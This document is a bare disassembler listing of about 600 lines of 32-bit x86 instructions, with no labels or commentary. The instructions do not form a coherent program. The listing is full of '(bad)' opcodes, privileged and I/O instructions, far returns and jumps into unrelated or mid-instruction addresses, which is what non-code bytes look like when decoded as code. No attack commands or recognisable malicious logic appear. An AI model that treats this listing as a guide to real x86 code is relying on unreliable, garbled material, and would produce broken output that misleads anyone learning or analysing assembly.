  4274fc:	test   BYTE PTR [eax+0x320198],bh
  427502:	mov    DWORD PTR [ebp+0x8],esi
  427505:	xor    eax,DWORD PTR [ebp-0x73]
  427508:	test   DWORD PTR [esp+esi*2-0x1],edi
  42750c:	mov    ebp,eax
  42750e:	mov    eax,0x33004d29
  427513:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427519:	add    DWORD PTR [eax],eax
  42751b:	add    BYTE PTR [ebp+0x30],al
  42751e:	mov    edx,DWORD PTR [edi-0x48]
  427521:	add    ebx,0xffffffe4
  427524:	push   0x2b74cd85
  427529:	mov    eax,DWORD PTR [ebx]
  42752b:	cld    
  42752c:	sar    BYTE PTR [eax+0x3b0145],1
  427532:	pcmpeqw mm4,mm6
  427535:	xor    edi,edi
  427537:	lea    ecx,[ebx-0x239c7470]
  42753d:	add    BYTE PTR [ebp+0x50],cl
  427540:	cmp    eax,DWORD PTR [ebp+0x75]
  427543:	mov    ebp,DWORD PTR [eax-0x68]
  427546:	test   DWORD PTR [eax],eax
  427548:	clc    
  427549:	push   DWORD PTR [ebp-0x1]
  42754c:	lea    ecx,[eax]
  42754e:	int3   
  42754f:	inc    ebp
  427550:	call   0xfaa5e0
  427555:	jne    0x42754f
  427557:	xor    edi,DWORD PTR [ebp-0x41]
  42755a:	jmp    0x4275ce
  42755c:	mov    eax,DWORD PTR [eax]
  42755e:	mov    eax,0x339545c7
  427563:	inc    DWORD PTR [ebx]
  427565:	push   DWORD PTR [ecx]
  427567:	aaa    
  427568:	mov    eax,DWORD PTR [eax]
  42756a:	jmp    0x4275bc
  42756c:	mov    eax,DWORD PTR [ebp-0x3c]
  42756f:	mov    eax,eax
  427571:	cld    
  427572:	clc    
  427573:	ret    
  427574:	test   bh,al
  427576:	pop    es
  427577:	xchg   ebp,eax
  427578:	add    bh,bh
  42757a:	inc    ebp
  42757b:	dec    DWORD PTR [edi]
  42757d:	and    DWORD PTR [ebx],ebp
  42757f:	add    BYTE PTR [eax],al
  427581:	push   eax
  427582:	jbe    0x4275d9
  427584:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  42758a:	or     al,0xcf
  42758c:	inc    eax
  42758d:	enter  0x745,0x72
  427591:	inc    ebp
  427592:	mov    eax,DWORD PTR [ecx]
  427594:	int3   
  427595:	add    BYTE PTR [ebp-0x75],al
  427598:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  42759e:	ror    BYTE PTR [ebp+0x72f80885],1
  4275a4:	inc    ebp
  4275a5:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4275ab:	fadd   st,st(6)
  4275ad:	rol    BYTE PTR [ebp+0x12],0x8b
  4275b1:	inc    ebp
  4275b2:	fmul   QWORD PTR [ebx-0x3c39233d]
  4275b8:	inc    ebp
  4275b9:	test   bh,al
  4275bb:	cwde   
  4275bc:	clc    
  4275bd:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4275c3:	inc    ebp
  4275c4:	cmp    dh,BYTE PTR [ebx]
  4275c6:	pushf  
  4275c7:	mov    ecx,0xffb48dc7
  4275cc:	test   eax,ecx
  4275ce:	clc    
  4275cf:	dec    ebp
  4275d0:	inc    ebp
  4275d1:	mov    edi,DWORD PTR [eax+ecx*1]
  4275d4:	pushf  
  4275d5:	rol    edi,0x86
  4275d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275d9:	inc    BYTE PTR [ebp+0x45f7f8ff]
  4275df:	inc    ebp
  4275e0:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  4275e8:	test   DWORD PTR [eax],edi
  4275ea:	clc    
  4275eb:	pushf  
  4275ec:	inc    ebp
  4275ed:	dec    DWORD PTR [ebx-0x3cba0f04]
  4275f3:	push   eax
  4275f4:	(bad)  
  4275f5:	cld    
  4275f6:	jge    0x4275f8
  4275f8:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4275fe:	add    BYTE PTR [ebx],dl
  427600:	jmp    0xcd7752
  427605:	les    eax,FWORD PTR [ebp-0x35]
  427608:	mov    ecx,esi
  42760a:	lock or al,cl
  42760d:	clc    
  42760e:	inc    ebp
  42760f:	add    esi,DWORD PTR [ebx]
  427611:	jge    0x427616
  427613:	xor    edi,DWORD PTR [ebx]
  427615:	cmp    ecx,DWORD PTR [edi]
  427617:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42761c:	mov    edi,DWORD PTR [ecx]
  42761e:	test   al,0xcc
  427620:	dec    ebp
  427621:	test   BYTE PTR [ebx],dh
  427623:	pop    es
  427624:	xor    eax,DWORD PTR [eax]
  427626:	add    ecx,DWORD PTR [esi]
  427628:	add    ecx,eax
  42762a:	psraw  mm0,mm1
  42762d:	sub    BYTE PTR [ebp+0x38],cl
  427630:	mov    edi,DWORD PTR [ebx]
  427632:	lock int3 
  427634:	shl    edx,1
  427636:	rol    BYTE PTR [ebp+0xc],1
  427639:	mov    DWORD PTR [ebp-0x24],0xf8038533
  427640:	jmp    0x7b768a
  427645:	pushf  
  427646:	inc    ebp
  427647:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  42764d:	xor    ecx,ebx
  42764f:	add    ecx,esi
  427651:	mov    esi,eax
  427653:	enter  0x45af,0x8b
  427657:	xor    ecx,eax
  427659:	add    edx,DWORD PTR [ebp-0x77]
  42765c:	sub    ecx,DWORD PTR [eax]
  42765e:	cmp    eax,DWORD PTR [ebp+0x77]
  427661:	fmul   DWORD PTR [ebx-0x76385764]
  427667:	test   al,0x0
  427669:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  42766f:	cmp    esi,DWORD PTR [ebx]
  427671:	pushf  
  427672:	xor    eax,edi
  427674:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  42767b:	inc    ebp
  42767c:	dec    ebp
  42767d:	cmp    eax,0xc7f09c8b
  427682:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  427689:	inc    ebp
  42768a:	jmp    0x4276cb
  42768c:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  427693:	dec    ebp
  427694:	xor    esi,DWORD PTR [ebx]
  427696:	add    eax,DWORD PTR [ebx]
  427698:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  42769e:	dec    ebp
  42769f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4276a5:	out    dx,eax
  4276a6:	rol    BYTE PTR [eax],1
  4276a8:	add    eax,0xebc8458b
  4276ad:	dec    ebp
  4276ae:	mov    ebp,DWORD PTR [ebx]
  4276b0:	mov    esp,0x33f84d8b
  4276b5:	ret    
  4276b6:	xor    eax,esi
  4276b8:	add    ecx,eax
  4276ba:	add    eax,DWORD PTR [edx+0xc1010f]
  4276c0:	dec    ebp
  4276c1:	inc    ebp
  4276c2:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4276c8:	ror    bl,1
  4276ca:	add    eax,0xebc645ce
  4276cf:	scas   eax,DWORD PTR es:[edi]
  4276d0:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4276d6:	xor    ebp,DWORD PTR [ebx]
  4276d8:	xor    edi,DWORD PTR [ebx]
  4276da:	add    esi,DWORD PTR [edi+0x3]
  4276dd:	mov    ecx,DWORD PTR [edi]
  4276df:	clc    
  4276e0:	rol    ebx,0x4d
  4276e3:	(bad)  
  4276e4:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4276eb:	mov    ah,0x45
  4276ed:	dec    ebp
  4276ee:	jbe    0x427723
  4276f0:	mov    esi,DWORD PTR [ebx]
  4276f2:	call   0x3345c3fa
  4276f7:	rdpmc  
  4276f9:	rol    DWORD PTR [ebx],0x4d
  4276fc:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427702:	inc    ebp
  427703:	ror    BYTE PTR [ebx+0x45450808],1
  427709:	jmp    0x10a7799
  42770e:	inc    ebp
  42770f:	inc    ebp
  427710:	(bad)  
  427711:	mov    ebx,eax
  427713:	clc    
  427714:	test   ebx,eax
  427716:	clc    
  427717:	retf   
  427718:	inc    ebp
  427719:	into   
  42771a:	mov    esi,0x8b85afec
  427720:	clc    
  427721:	enter  0x5545,0x3a
  427725:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42772c:	ret    
  42772d:	mov    ah,0xc6
  42772f:	addr16 push 0x338b4545
  427735:	clc    
  427736:	add    eax,ebx
  427738:	loopne 0x427705
  42773a:	dec    ebp
  42773b:	into   
  42773c:	mov    al,dh
  42773e:	or     BYTE PTR [edi-0x37ff748e],ch
  427744:	inc    ebp
  427745:	push   ebp
  427746:	mov    ebp,DWORD PTR [ebx]
  427748:	in     al,dx
  427749:	cmp    eax,ebx
  42774b:	ja     0x427792
  42774d:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  427753:	inc    ebp
  427754:	cwde   
  427755:	mov    esi,DWORD PTR [edx]
  427757:	clc    
  427758:	mov    bl,al
  42775a:	xlat   BYTE PTR ds:[ebx]
  42775b:	retf   
  42775c:	inc    ebp
  42775d:	into   
  42775e:	mov    eax,esi
  427760:	in     al,dx
  427761:	scas   eax,DWORD PTR es:[edi]
  427762:	retf   
  427763:	mov    ecx,DWORD PTR [ebp-0x38]
  427766:	mov    edx,DWORD PTR [ebp-0x24]
  427769:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  427770:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  427777:	mov    eax,DWORD PTR [ebx]
  427779:	clc    
  42777a:	loopne 0x42773f
  42777c:	push   ebp
  42777d:	retf   
  42777e:	mov    dh,al
  427780:	adc    esi,ecx
  427782:	jb     0x427733
  427784:	add    BYTE PTR [ebx+0x558bc845],cl
  42778a:	in     al,dx
  42778b:	sub    eax,ebx
  42778d:	cmp    ecx,ebx
  42778f:	mov    eax,esi
  427791:	mov    esp,0x45af03ce
  427796:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  42779c:	mov    eax,ebx
  42779e:	in     al,dx
  42779f:	into   
  4277a0:	dec    ebp
  4277a1:	(bad)  
  4277a2:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4277a8:	rol    DWORD PTR [ebp+0x4d],0x89
  4277ac:	xor    esp,esp
  4277ae:	sub    eax,DWORD PTR [ebp-0x75]
  4277b1:	add    ebp,esp
  4277b3:	mov    al,0x55
  4277b5:	inc    ebp
  4277b6:	xor    edi,DWORD PTR [eax]
  4277b8:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4277bf:	inc    ebp
  4277c0:	xor    edi,DWORD PTR [ecx]
  4277c2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4277c9:	test   DWORD PTR [eax],eax
  4277cb:	clc    
  4277cc:	enter  0x8645,0x33
  4277d0:	inc    DWORD PTR [ebx]
  4277d2:	(bad)  
  4277d3:	jmp    0x42781a
  4277d5:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4277db:	inc    ebp
  4277dc:	(bad)  
  4277dd:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4277e3:	cwde   
  4277e4:	retf   
  4277e5:	xor    al,cl
  4277e7:	mov    BYTE PTR [ebp+0xb],cl
  4277ea:	lea    eax,[ebp+0x8]
  4277ed:	xor    esi,DWORD PTR [edx+0x3]
  4277f0:	add    al,ah
  4277f2:	inc    ebp
  4277f3:	dec    ebp
  4277f4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4277fa:	push   0x2b45cd00
  4277ff:	mov    al,BYTE PTR [ebx]
  427801:	or     esi,eax
  427803:	dec    ebp
  427804:	inc    ebp
  427805:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  42780b:	push   ebp
  42780c:	(bad)  
  42780d:	mov    BYTE PTR [edi+0xf723b11],ch
  427813:	add    ch,ch
  427815:	inc    ebp
  427816:	dec    DWORD PTR [ebx-0x34332775]
  42781c:	add    al,0x4d
  42781e:	inc    ebp
  42781f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427825:	cwde   
  427826:	add    DWORD PTR [edx],esi
  427828:	add    BYTE PTR [ebx+0x4d00c000],cl
  42782e:	push   DWORD PTR [ebx]
  427830:	int3   
  427831:	xor    eax,DWORD PTR [eax]
  427833:	add    edx,DWORD PTR [eax+0x3]
  427836:	mov    DWORD PTR [edi],ecx
  427838:	call   0x428838fe
  42783d:	mov    DWORD PTR [ebp-0x20],esp
  427840:	add    BYTE PTR [ebp+0x7d],al
  427843:	mov    eax,DWORD PTR [eax]
  427845:	in     al,0x15
  427847:	ret    
  427848:	iret   
  427849:	(bad)  
  42784a:	enter  0x14af,0x8b
  42784e:	(bad)  
  42784f:	in     al,dx
  427850:	or     bl,cl
  427852:	adc    cl,al
  427854:	push   ebp
  427855:	dec    ebp
  427856:	inc    eax
  427857:	mov    edx,DWORD PTR [ebp-0x20]
  42785a:	jb     0x427827
  42785c:	mov    ecx,esi
  42785e:	cld    
  42785f:	scas   eax,DWORD PTR es:[edi]
  427860:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427867:	mov    BYTE PTR [eax],0x8c
  42786a:	push   0xffffff98
  42786c:	push   edi
  42786d:	xor    dl,BYTE PTR [eax+0x3b]
  427870:	mov    ecx,DWORD PTR [edi]
  427872:	call   0x8c41bdd5
  427877:	mov    eax,eax
  427879:	in     al,dx
  42787a:	jge    0x4278c9
  42787c:	mov    DWORD PTR [ebx],esi
  42787e:	int3   
  42787f:	add    eax,DWORD PTR [ebp+0xf]
  427882:	xor    eax,ecx
  427884:	(bad)  
  427885:	dec    ebp
  427886:	pushf  
  427887:	xor    ecx,eax
  427889:	add    edi,DWORD PTR [edi]
  42788b:	mov    eax,DWORD PTR [ebp-0x38]
  42788e:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427895:	mov    DWORD PTR [edx+0xf4505c8],ecx
  42789b:	xor    edx,DWORD PTR [ecx+edi*4]
  42789e:	or     BYTE PTR [ebp-0x371600bd],0xf
  4278a5:	dec    ebp
  4278a6:	leave  
  4278a7:	mov    edx,ecx
  4278a9:	rol    BYTE PTR [ebp+0x330155],1
  4278af:	add    ecx,DWORD PTR [ebp+0xf]
  4278b2:	xor    eax,edx
  4278b4:	(bad)  
  4278b5:	ror    DWORD PTR [eax],0x86
  4278b8:	jb     0x4278b7
  4278ba:	add    bh,bh
  4278bc:	clc    
  4278bd:	inc    ebp
  4278be:	jb     0x42792a
  4278c0:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4278c6:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  4278cc:	shr    BYTE PTR [eax-0x3d],0x30
  4278d0:	clc    
  4278d1:	add    BYTE PTR [ebp+0x75],al
  4278d4:	cmp    BYTE PTR [edx-0x64],ch
  4278d7:	inc    edi
  4278d9:	adc    al,0xe8
  4278db:	inc    ebp
  4278dc:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4278e2:	mov    ecx,DWORD PTR [eax]
  4278e4:	cld    
  4278e5:	or     DWORD PTR [ebp-0x34],0x33
  4278e9:	jbe    0x4278ee
  4278eb:	mov    edx,DWORD PTR [ecx+0x2b]
  4278ee:	dec    ebp
  4278ef:	mov    cl,BYTE PTR [ebx+0x45d801]
  4278f5:	mov    BYTE PTR [ebx],dh
  4278f7:	mov    eax,DWORD PTR [ebx]
  4278f9:	or     BYTE PTR [ecx+0x3b],dl
  4278fc:	dec    ebp
  4278fd:	int3   
  4278fe:	xor    ebp,edi
  427900:	add    eax,DWORD PTR [ebp+0x51]
  427903:	mov    ecx,DWORD PTR [ebp-0x28]
  427906:	xor    eax,DWORD PTR [eax]
  427908:	add    ebp,DWORD PTR [eax+0x51]
  42790b:	adc    BYTE PTR [eax+0x0],0x8b
  42790f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427915:	inc    ebp
  427916:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  42791c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427922:	dec    ebp
  427923:	mov    esi,DWORD PTR [ebx]
  427925:	hlt    
  427926:	add    eax,ebx
  427928:	push   ecx
  427929:	inc    ebp
  42792a:	dec    ebp
  42792b:	sar    bh,1
  42792d:	shl    ah,1
  42792f:	(bad)  
  427930:	retf   
  427931:	mov    al,ds:0xc5ff3dce
  427936:	adc    al,0xc6
  427938:	inc    ebp
  427939:	and    eax,0x9c0f4c85
  42793e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427945:	cmp    BYTE PTR [ebx+0x3b],0x0
  427949:	mov    dh,0xc7
  42794b:	cmp    eax,eax
  42794d:	jne    0x45437199
  427953:	mov    edi,DWORD PTR [edx]
  427955:	mov    eax,0x848bcb9c
  42795a:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427961:	or     BYTE PTR [edi],cl
  427963:	(bad)  
  427964:	dec    ebp
  427965:	inc    edi
  427966:	add    bh,0x50
  427969:	or     cl,ch
  42796b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427971:	xchg   DWORD PTR [eax-0x1638af64],eax
  427977:	mov    esp,0xf802b588
  42797c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42797d:	inc    ebp
  42797e:	(bad)  
  42797f:	cmp    al,0xff
  427981:	pushf  
  427982:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427989:	mov    ecx,DWORD PTR [ebp-0x340018]
  42798f:	into   
  427990:	dec    DWORD PTR [ebx-0x7f72431c]
  427996:	push   0x5000ff01
  42799b:	retf   
  42799c:	inc    ebp
  42799d:	into   
  42799e:	dec    DWORD PTR [ebx-0x343f3ff4]
  4279a4:	push   eax
  4279a5:	into   
  4279a6:	call   0x4a7e36
  4279ab:	retf   
  4279ac:	add    dh,cl
  4279ae:	add    bh,bh
  4279b0:	mov    DWORD PTR [eax+ecx*1],edx
  4279b3:	clc    
  4279b4:	inc    ebp
  4279b5:	inc    ebp
  4279b6:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4279bc:	push   0x1
  4279be:	push   edi
  4279bf:	add    BYTE PTR [eax-0x35],dl
  4279c2:	mov    ecx,esi
  4279c4:	cld    
  4279c5:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4279cb:	into   
  4279cc:	ror    BYTE PTR [ebx+0x75000800],0x50
  4279d3:	xor    eax,DWORD PTR [ebp+0x3]
  4279d6:	jne    0x427a29
  4279d8:	call   DWORD PTR [eax-0x3c]
  4279db:	mov    DWORD PTR [ecx-0x18],edx
  4279de:	mov    edi,edi
  4279e0:	call   0x8b45bf69
  4279e5:	add    ah,ah
  4279e7:	rol    BYTE PTR [ebp-0x7c],0xeb
  4279eb:	add    edi,edi
  4279ed:	add    al,ch
  4279ef:	inc    ebp
  4279f0:	push   ecx
  4279f1:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  4279f7:	mov    al,0xc7
  4279f9:	test   esp,esp
  4279fb:	clc    
  4279fc:	test   DWORD PTR [ebp-0x8],ecx
  4279ff:	add    BYTE PTR [ebp+0x50],0x39
  427a03:	jmp    0x8bcc02a4
  427a08:	in     al,dx
  427a09:	or     BYTE PTR [ebp-0xf],al
  427a0c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427a12:	hlt    
  427a13:	mov    eax,DWORD PTR [ebp-0x50]
  427a16:	xor    esi,ecx
  427a18:	add    eax,DWORD PTR [eax+0x4f086889]
  427a1e:	inc    ebp
  427a1f:	sbb    eax,0x68
  427a22:	pushf  
  427a23:	inc    edi
  427a25:	add    al,ch
  427a27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a28:	test   edi,edi
  427a2a:	clc    
  427a2b:	inc    DWORD PTR [ebp-0x73]
  427a2e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427a32:	(bad)  
  427a33:	push   ecx
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	jne    0x4279bc
  427a37:	push   eax
  427a38:	clc    
  427a39:	test   DWORD PTR [ebp-0x1],eax
  427a3c:	cmp    eax,0xc78b9cff
  427a41:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427a48:	inc    ebp
  427a49:	push   edi
  427a4a:	aas    
  427a4b:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427a52:	dec    ebp
  427a53:	add    BYTE PTR [ebx],dh
  427a55:	inc    ebp
  427a56:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427a5c:	enter  0x8401,0x0
  427a60:	add    al,BYTE PTR [eax]
  427a62:	add    bh,bh
  427a64:	out    dx,eax
  427a65:	sbb    BYTE PTR [eax],al
  427a67:	dec    ebp
  427a68:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427a6e:	sub    esi,DWORD PTR [ebx]
  427a70:	mov    ebp,DWORD PTR [eax-0x8]
  427a73:	add    bl,0x0
  427a76:	(bad)  
  427a77:	cmp    eax,ecx
  427a79:	or     BYTE PTR [edx+0x750114],al
  427a7f:	inc    DWORD PTR [ebp+0x18]
  427a82:	mov    eax,DWORD PTR [ebp-0x8]
  427a85:	mov    ebx,eax
  427a87:	(bad)  
  427a88:	retf   
  427a89:	inc    ebp
  427a8a:	into   
  427a8b:	mov    esi,eax
  427a8d:	int3   
  427a8e:	scas   eax,DWORD PTR es:[edi]
  427a8f:	push   es
  427a90:	mov    esi,DWORD PTR [ebp-0xc]
  427a93:	call   DWORD PTR [ebp+0x18]
  427a96:	sub    edi,DWORD PTR [ebp+0x3b]
  427a99:	mov    esi,DWORD PTR [edi-0x34]
  427a9c:	mov    eax,DWORD PTR [ebp-0x8]
  427a9f:	cmp    bl,al
  427aa1:	pushf  
  427aa2:	mov    bh,0xbc
  427aa5:	fadd   QWORD PTR [eax]
  427aa7:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427aad:	mov    esi,DWORD PTR [ebx]
  427aaf:	in     al,0x33
  427ab1:	ret    
  427ab2:	add    eax,esi
  427ab4:	add    eax,DWORD PTR [ebp+0xf]
  427ab7:	mov    eax,ecx
  427ab9:	in     al,0x4d
  427abb:	ret    
  427abc:	mov    eax,esi
  427abe:	in     al,dx
  427abf:	inc    ebp
  427ac0:	rol    edi,1
  427ac2:	sar    al,1
  427ac4:	or     BYTE PTR [ebp+0x45e9f845],al
  427aca:	add    BYTE PTR [edx],bh
  427acc:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427ad3:	test   ebx,eax
  427ad5:	clc    
  427ad6:	retf   
  427ad7:	inc    ebp
  427ad8:	into   
  427ad9:	cmp    al,0xc6
  427adb:	pushf  
  427adc:	scas   eax,DWORD PTR es:[edi]
  427add:	(bad)  
  427ade:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427ae5:	inc    ebp
  427ae6:	cmp    edi,DWORD PTR [esi]
  427ae8:	ja     0x427a86
  427aea:	mov    eax,edi
  427aec:	mov    esp,0x458567a8
  427af1:	clc    
  427af2:	mov    eax,DWORD PTR [ebp-0x8]
  427af5:	mov    eax,ebx
  427af7:	in     al,dx
  427af8:	retf   
  427af9:	ret    
  427afa:	into   
  427afb:	mov    dh,0x7d
  427afe:	scas   eax,DWORD PTR es:[edi]
  427aff:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427b05:	add    BYTE PTR [ebx],ch
  427b07:	jmp    0xb97c47
  427b0c:	mov    eax,DWORD PTR [ebp-0x5c]
  427b0f:	mov    eax,DWORD PTR [ebp-0x14]
  427b12:	inc    ebp
  427b13:	enter  0x458b,0xf8
  427b17:	xor    eax,ebx
  427b19:	add    ecx,ebx
  427b1b:	cmp    ecx,esi
  427b1d:	shufps xmm7,xmm4,0xaf
  427b21:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427b27:	dec    ebp
  427b28:	sub    esi,DWORD PTR [ebx]
  427b2a:	cmp    esi,DWORD PTR [ebx]
  427b2c:	ja     0x427b31
  427b2e:	mov    eax,DWORD PTR [ebx]
  427b30:	lods   al,BYTE PTR ds:[esi]
  427b31:	mov    db0,ecx
  427b34:	inc    ebp
  427b35:	dec    ebp
  427b36:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427b3c:	retf   
  427b3d:	rol    dh,1
  427b3f:	or     al,0xce
  427b41:	inc    ebp
  427b42:	scas   eax,DWORD PTR es:[edi]
  427b43:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427b49:	add    BYTE PTR [ebx],ch
  427b4b:	add    BYTE PTR [ebx],bh
  427b4d:	inc    ebp
  427b4e:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427b54:	inc    ebp
  427b55:	retf   
  427b56:	mov    ecx,esi
  427b58:	clc    
  427b59:	(bad)  
  427b5a:	retf   
  427b5b:	scas   eax,DWORD PTR es:[edi]
  427b5c:	ret    
  427b5d:	mov    ecx,esi
  427b5f:	hlt    
  427b60:	(bad)  
  427b61:	push   ebp
  427b62:	scas   eax,DWORD PTR es:[edi]
  427b63:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427b69:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427b6f:	add    BYTE PTR [ebx],al
  427b71:	mov    eax,eax
  427b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b74:	inc    ebp
  427b75:	dec    ebp
  427b76:	cmp    BYTE PTR [ebx],dh
  427b78:	pushf  
  427b79:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427b7f:	(bad)  
  427b81:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427b89:	sar    eax,1
  427b8b:	rol    BYTE PTR [ebp+0x5],1
  427b8e:	xor    eax,DWORD PTR [ebp+0x3]
  427b91:	jmp    0x427b7e
  427b93:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427b99:	xor    eax,DWORD PTR [ebp+0x33]
  427b9c:	mov    eax,DWORD PTR [ebx]
  427b9e:	rol    BYTE PTR [ebx],1
  427ba0:	test   BYTE PTR [edi],cl
  427ba2:	cwde   
  427ba3:	shl    DWORD PTR [edx],0x4d
  427ba6:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427bac:	xor    edx,eax
  427bae:	add    eax,DWORD PTR ds:0xeb4d45e0
  427bb4:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427bba:	add    BYTE PTR [ebx],dh
  427bbc:	inc    ebp
  427bbd:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427bc3:	rdpmc  
  427bc5:	rol    DWORD PTR [ebx],0x4d
  427bc8:	loopne 0x427b55
  427bca:	push   ebp
  427bcb:	in     al,dx
  427bcc:	mov    cl,dl
  427bce:	adc    eax,edx
  427bd0:	jb     0x427bd7
  427bd2:	add    BYTE PTR [ebp+0x45],al
  427bd5:	jmp    0x427b62
  427bd7:	mov    ebx,eax
  427bd9:	test   al,0xcb
  427bdb:	dec    ebp
  427bdc:	dec    ebp
  427bdd:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427be3:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427be9:	dec    ebp
  427bea:	mov    al,0x8b
  427bec:	dec    ebp
  427bed:	in     al,dx
  427bee:	xor    edx,ecx
  427bf0:	xor    edx,eax
  427bf2:	add    eax,DWORD PTR [ebp+0x3]
  427bf5:	jbe    0x427c06
  427bf7:	mov    eax,ecx
  427bf9:	test   al,0x45
  427bfb:	dec    ebp
  427bfc:	mov    DWORD PTR [ebx],esi
  427bfe:	loopne 0x427c33
  427c00:	inc    ebp
  427c01:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427c07:	rol    esi,0x45
  427c0a:	scas   eax,DWORD PTR es:[edi]
  427c0b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427c11:	mov    eax,ecx
  427c13:	hlt    
  427c14:	dec    ebp
  427c15:	inc    ebp
  427c16:	mov    eax,edi
  427c18:	loopne 0x427bf2
  427c1a:	retf   
  427c1b:	test   esi,ecx
  427c1d:	clc    
  427c1e:	scas   eax,DWORD PTR es:[edi]
  427c1f:	inc    ebp
  427c20:	mov    eax,edi
  427c22:	fdiv   st,st(0)
  427c24:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427c2a:	cwde   
  427c2b:	cmp    dh,BYTE PTR [edx]
  427c2d:	pushf  
  427c2e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427c34:	inc    esi
  427c36:	mov    ebp,DWORD PTR [eax-0x10]
  427c39:	inc    ebp
  427c3a:	dec    ebp
  427c3b:	xor    esi,DWORD PTR [ebx]
  427c3d:	add    eax,DWORD PTR [ebx]
  427c3f:	loopne 0x427c50
  427c41:	dec    ebp
  427c42:	ror    DWORD PTR [edx+0x7233084d],0x3
  427c49:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
